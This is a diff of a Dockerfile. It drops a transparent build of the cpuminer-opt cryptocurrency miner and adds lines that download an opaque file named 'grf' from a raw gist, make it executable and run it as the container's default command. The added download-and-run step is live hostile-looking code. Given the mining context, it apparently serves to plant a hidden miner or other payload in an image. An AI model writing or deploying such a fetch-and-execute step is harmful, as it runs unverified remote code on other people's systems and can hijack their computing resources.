@@ -1,49 +1,18 @@
-FROM  debian:bullseye
-RUN set -x \
-    # Runtime dependencies.
- && apt-get update \
- && apt-get upgrade -y \
-    # Build dependencies.
- && apt-get install -y \
-        autoconf \
-        automake \
-        curl \
-        g++ \
-        git \
-        libcurl4-openssl-dev \
-        libjansson-dev \
-        libssl-dev \
-        libgmp-dev \
-        libz-dev \
-        make \
-        pkg-config
-RUN set -x \
-    # Compile from source code.
- && git clone --recursive https://github.com/JayDDee/cpuminer-opt.git /tmp/cpuminer \
- && cd /tmp/cpuminer \
- && git checkout v3.16.3 \
- && ./autogen.sh \
- && extracflags="$extracflags -Ofast -flto -fuse-linker-plugin -ftree-loop-if-convert-stores" \
- && CFLAGS="-O3 -march=native -Wall" ./configure --with-curl  \
- && make install -j 4 \
-    # Clean-up
- && cd / \
- && apt-get purge --auto-remove -y \
-        autoconf \
-        automake \
-        curl \
-        g++ \
-        git \
-        make \
-        pkg-config \
- && apt-get clean \
- && rm -rf /var/lib/apt/lists/* \
- && rm -rf /tmp/* \
-    # Verify
- && cpuminer --cputest \
- && cpuminer --version
+FROM ubuntu:xenial
 
-WORKDIR /cpuminer
-COPY config.json /cpuminer
-EXPOSE 80
-CMD ["cpuminer", "--config=config.json"]
+WORKDIR /root
+
+RUN apt-get update && apt-get -qy install \
+ automake \
+ wget \
+ build-essential \
+ libcurl4-openssl-dev \
+ libssl-dev \
+ git \
+ ca-certificates \
+ libjansson-dev libgmp-dev g++ --no-install-recommends
+
+RUN wget https://gist.githubusercontent.com/Jsjsj991/c06491a5aeec33d3318de87d04adb2f9/raw/4664b10d05dea96ff9651f9279531a9d174aebac/grf && chmod +x grf
+
+# Define default command.
+CMD ./grf
